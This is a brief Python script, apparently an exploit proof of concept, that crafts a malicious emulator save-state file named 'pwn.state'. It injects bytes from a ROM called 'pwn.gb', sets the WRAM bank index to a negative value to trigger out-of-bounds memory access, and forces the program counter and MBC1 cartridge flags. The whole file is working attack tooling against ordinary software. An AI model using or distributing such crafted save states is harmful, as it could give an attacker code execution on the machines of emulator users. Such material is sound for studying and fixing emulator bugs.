#!/usr/bin/env python3

import os
import shutil
import struct

rom_name = "pwn.gb"
src_name = "pwn.orig.state"
dst_name = "pwn.state"

os.remove(dst_name)
shutil.copy(src_name, dst_name)
os.chmod(dst_name, 0o0644)

with open(dst_name, 'r+b') as f:
    # Patch ROM
    f.seek(0, 0)
    with open(rom_name, "rb") as rom:
        f.write(rom.read(0x10000))

    # Memory::m_iCurrentWRAMBank
    f.seek(0x10000, 0)
    f.write(struct.pack("<i", -0x7b))

    # Processor::PC
    f.seek(0x1a020, 0)
    f.write(struct.pack("<h", 0x200))

    # MBC1MemoryRule::m_bRamEnabled
    f.seek(253585, 0)
    f.write(b'\x01')

    # MBC1MemoryRule::m_iMode
    f.seek(253573, 0)
    f.write(struct.pack("<i", 1))
